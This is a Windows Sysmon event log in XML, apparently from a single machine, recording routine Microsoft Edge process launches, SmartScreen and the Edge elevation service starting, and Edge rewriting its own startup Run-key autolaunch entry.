<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:52.9944107Z'/><EventRecordID>29</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:52.993</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-1503-000000000a00}</Data><Data Name='ProcessId'>10384</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\identity_helper.exe</Data><Data Name='FileVersion'>152.0.4191.66</Data><Data Name='Description'>PWA Identity Proxy Host</Data><Data Name='Product'>Microsoft Edge</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>identity_helper.exe</Data><Data Name='CommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\identity_helper.exe" --type=utility --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService --lang=en-GB --service-sandbox-type=windows_package_identity --skip-read-main-dll --metrics-shmem-handle=6140,i,10020148375142900034,15695028157601875905,524288 --field-trial-handle=2496,i,11309663674374989354,9957335283911033552,262144 --variations-seed-version --pseudonymization-salt-handle=2468,i,12788403181645571105,18140516375752026917,4 --trace-process-track-uuid=3190708994745248135 --mojo-platform-channel-handle=6124 /prefetch:14</Data><Data Name='CurrentDirectory'>C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-2a66-6aa3-5cf0-210000000000}</Data><Data Name='LogonId'>0x21f05c</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=29D62A2F497267AF1AF7FC4A24FBB213,SHA256=E76B33F6262F61C8401EB4F55D730E00CB6AFCCAADC51971E14ABC8A31B52323,IMPHASH=497AE51AD32BA861108FD684650862C7</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3884-6aa3-0803-000000000a00}</Data><Data Name='ParentProcessId'>3020</Data><Data Name='ParentImage'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --flag-switches-begin --flag-switches-end --no-startup-window</Data><Data Name='ParentUser'>Abraham\antho</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:52.9799607Z'/><EventRecordID>28</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2026-09-10 23:08:52.977</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-0803-000000000a00}</Data><Data Name='ProcessId'>3020</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='TargetObject'>HKU\S-1-5-21-2949513920-1191672773-928204500-1001\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftEdgeAutoLaunch_22678834D11EF8347D026DFE52821DD9</Data><Data Name='Details'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start</Data><Data Name='User'>Abraham\antho</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:52.9798636Z'/><EventRecordID>27</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:52.964</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-1403-000000000a00}</Data><Data Name='ProcessId'>8044</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\identity_helper.exe</Data><Data Name='FileVersion'>152.0.4191.66</Data><Data Name='Description'>PWA Identity Proxy Host</Data><Data Name='Product'>Microsoft Edge</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>identity_helper.exe</Data><Data Name='CommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\identity_helper.exe" --type=utility --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService --lang=en-GB --service-sandbox-type=windows_package_identity --skip-read-main-dll --metrics-shmem-handle=6140,i,10020148375142900034,15695028157601875905,524288 --field-trial-handle=2496,i,11309663674374989354,9957335283911033552,262144 --variations-seed-version --pseudonymization-salt-handle=2468,i,12788403181645571105,18140516375752026917,4 --trace-process-track-uuid=3190708994745248135 --mojo-platform-channel-handle=6124 /prefetch:14</Data><Data Name='CurrentDirectory'>C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-2a66-6aa3-5cf0-210000000000}</Data><Data Name='LogonId'>0x21f05c</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=29D62A2F497267AF1AF7FC4A24FBB213,SHA256=E76B33F6262F61C8401EB4F55D730E00CB6AFCCAADC51971E14ABC8A31B52323,IMPHASH=497AE51AD32BA861108FD684650862C7</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3884-6aa3-0803-000000000a00}</Data><Data Name='ParentProcessId'>3020</Data><Data Name='ParentImage'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --flag-switches-begin --flag-switches-end --no-startup-window</Data><Data Name='ParentUser'>Abraham\antho</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:52.8939070Z'/><EventRecordID>26</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:52.880</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-1303-000000000a00}</Data><Data Name='ProcessId'>10696</Data><Data Name='Image'>C:\Windows\System32\smartscreen.exe</Data><Data Name='FileVersion'>10.0.26100.9278 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Defender SmartScreen</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>smartscreen.exe</Data><Data Name='CommandLine'>C:\Windows\System32\smartscreen.exe -Embedding</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-2a66-6aa3-5cf0-210000000000}</Data><Data Name='LogonId'>0x21f05c</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=3ABC85C0D045F0244C34AF62CB6ACD99,SHA256=11F0BBE2201D0340A8BF5AEB7531B2D59FBF8CF091BDC3ED3FA5B985A0C58D0F,IMPHASH=3D967AE398FD13D8BAF1933856991799</Data><Data Name='ParentProcessGuid'>{c4fe85a1-264d-6aa3-0d00-000000000a00}</Data><Data Name='ParentProcessId'>372</Data><Data Name='ParentImage'>C:\Windows\System32\svchost.exe</Data><Data Name='ParentCommandLine'>C:\WINDOWS\system32\svchost.exe -k DcomLaunch -p</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:52.7457459Z'/><EventRecordID>25</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>DeleteValue</Data><Data Name='UtcTime'>2026-09-10 23:08:52.743</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-0803-000000000a00}</Data><Data Name='ProcessId'>3020</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='TargetObject'>HKU\S-1-5-21-2949513920-1191672773-928204500-1001\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftEdgeAutoLaunch_22678834D11EF8347D026DFE52821DD9</Data><Data Name='User'>Abraham\antho</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:52.3984119Z'/><EventRecordID>24</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:52.394</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-0e03-000000000a00}</Data><Data Name='ProcessId'>7672</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='FileVersion'>152.0.4191.66</Data><Data Name='Description'>Microsoft Edge</Data><Data Name='Product'>Microsoft Edge</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>msedge.exe</Data><Data Name='CommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=edge_collections.mojom.CollectionsDataManager --lang=en-GB --service-sandbox-type=collections --ssd-no-pressure-read-main-dll --metrics-shmem-handle=3860,i,1468560978626687919,5079123801183710683,524288 --field-trial-handle=2496,i,11309663674374989354,9957335283911033552,262144 --variations-seed-version --pseudonymization-salt-handle=2468,i,12788403181645571105,18140516375752026917,4 --trace-process-track-uuid=3190708991934122588 --mojo-platform-channel-handle=3872 /prefetch:14</Data><Data Name='CurrentDirectory'>C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-2a66-6aa3-5cf0-210000000000}</Data><Data Name='LogonId'>0x21f05c</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Low</Data><Data Name='Hashes'>MD5=37420AADF41F7DFE771A2B4BF5D4EDBA,SHA256=02AAED8823A4E4BAE8F672C620C9356BDDEBD68651D5BFD141ED9E6576D5F03C,IMPHASH=5CF043BE24821D48FE2001EA6C178A8F</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3884-6aa3-0803-000000000a00}</Data><Data Name='ParentProcessId'>3020</Data><Data Name='ParentImage'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --flag-switches-begin --flag-switches-end --no-startup-window</Data><Data Name='ParentUser'>Abraham\antho</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:52.3211223Z'/><EventRecordID>23</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:52.306</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-0d03-000000000a00}</Data><Data Name='ProcessId'>10272</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='FileVersion'>152.0.4191.66</Data><Data Name='Description'>Microsoft Edge</Data><Data Name='Product'>Microsoft Edge</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>msedge.exe</Data><Data Name='CommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-GB --service-sandbox-type=service --startup-read-main-dll --metrics-shmem-handle=2964,i,1546407431406231798,17384567803867681104,524288 --field-trial-handle=2496,i,11309663674374989354,9957335283911033552,262144 --variations-seed-version --pseudonymization-salt-handle=2468,i,12788403181645571105,18140516375752026917,4 --trace-process-track-uuid=3190708990060038890 --mojo-platform-channel-handle=2976 /prefetch:13</Data><Data Name='CurrentDirectory'>C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-2a66-6aa3-5cf0-210000000000}</Data><Data Name='LogonId'>0x21f05c</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Low</Data><Data Name='Hashes'>MD5=37420AADF41F7DFE771A2B4BF5D4EDBA,SHA256=02AAED8823A4E4BAE8F672C620C9356BDDEBD68651D5BFD141ED9E6576D5F03C,IMPHASH=5CF043BE24821D48FE2001EA6C178A8F</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3884-6aa3-0803-000000000a00}</Data><Data Name='ParentProcessId'>3020</Data><Data Name='ParentImage'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --flag-switches-begin --flag-switches-end --no-startup-window</Data><Data Name='ParentUser'>Abraham\antho</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:52.2867667Z'/><EventRecordID>22</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:52.264</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-0c03-000000000a00}</Data><Data Name='ProcessId'>7840</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\elevation_service.exe</Data><Data Name='FileVersion'>152.0.4191.66</Data><Data Name='Description'>Microsoft Edge</Data><Data Name='Product'>Microsoft Edge</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>elevation_service.exe</Data><Data Name='CommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\elevation_service.exe"</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{c4fe85a1-264c-6aa3-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=A1197A2176E36C80FE9E153FED05BAF1,SHA256=483C1B371F462F296B6FEFABCAA430D703EC36D006194CFF553FB7CFA4C6950F,IMPHASH=0702B46FFAF97DD37D6E6534A63AC758</Data><Data Name='ParentProcessGuid'>{c4fe85a1-264c-6aa3-0b00-000000000a00}</Data><Data Name='ParentProcessId'>880</Data><Data Name='ParentImage'>C:\Windows\System32\services.exe</Data><Data Name='ParentCommandLine'>C:\WINDOWS\system32\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:52.2620127Z'/><EventRecordID>21</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:52.255</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-0b03-000000000a00}</Data><Data Name='ProcessId'>6584</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='FileVersion'>152.0.4191.66</Data><Data Name='Description'>Microsoft Edge</Data><Data Name='Product'>Microsoft Edge</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>msedge.exe</Data><Data Name='CommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --startup-read-main-dll --metrics-shmem-handle=2488,i,13948529499293819330,12802016116258518602,524288 --field-trial-handle=2496,i,11309663674374989354,9957335283911033552,262144 --variations-seed-version --pseudonymization-salt-handle=2468,i,12788403181645571105,18140516375752026917,4 --trace-process-track-uuid=3190708989122997041 --mojo-platform-channel-handle=2644 /prefetch:11</Data><Data Name='CurrentDirectory'>C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-2a66-6aa3-5cf0-210000000000}</Data><Data Name='LogonId'>0x21f05c</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=37420AADF41F7DFE771A2B4BF5D4EDBA,SHA256=02AAED8823A4E4BAE8F672C620C9356BDDEBD68651D5BFD141ED9E6576D5F03C,IMPHASH=5CF043BE24821D48FE2001EA6C178A8F</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3884-6aa3-0803-000000000a00}</Data><Data Name='ParentProcessId'>3020</Data><Data Name='ParentImage'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --flag-switches-begin --flag-switches-end --no-startup-window</Data><Data Name='ParentUser'>Abraham\antho</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:52.2600641Z'/><EventRecordID>20</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:52.254</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-0a03-000000000a00}</Data><Data Name='ProcessId'>3960</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='FileVersion'>152.0.4191.66</Data><Data Name='Description'>Microsoft Edge</Data><Data Name='Product'>Microsoft Edge</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>msedge.exe</Data><Data Name='CommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=gpu-process --gpu-preferences=WAAAAAAAAADgAAAEAAAAAAAAAAAAAGAAQAAAAAAAAAADAAAAAAAAADgAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAoAAAAAAAAAAgAAAAAAAAAEAAAAAIAAAABAAAAAAAAAAgAAAAAAAAACAAAAAAAAAA= --startup-read-main-dll --metrics-shmem-handle=2248,i,1396311214940853627,7251037780965848632,262144 --field-trial-handle=2496,i,11309663674374989354,9957335283911033552,262144 --variations-seed-version --pseudonymization-salt-handle=2468,i,12788403181645571105,18140516375752026917,4 --trace-process-track-uuid=3190708988185955192 --mojo-platform-channel-handle=2476 /prefetch:2</Data><Data Name='CurrentDirectory'>C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-2a66-6aa3-5cf0-210000000000}</Data><Data Name='LogonId'>0x21f05c</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Low</Data><Data Name='Hashes'>MD5=37420AADF41F7DFE771A2B4BF5D4EDBA,SHA256=02AAED8823A4E4BAE8F672C620C9356BDDEBD68651D5BFD141ED9E6576D5F03C,IMPHASH=5CF043BE24821D48FE2001EA6C178A8F</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3884-6aa3-0803-000000000a00}</Data><Data Name='ParentProcessId'>3020</Data><Data Name='ParentImage'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --flag-switches-begin --flag-switches-end --no-startup-window</Data><Data Name='ParentUser'>Abraham\antho</Data></EventData></Event>
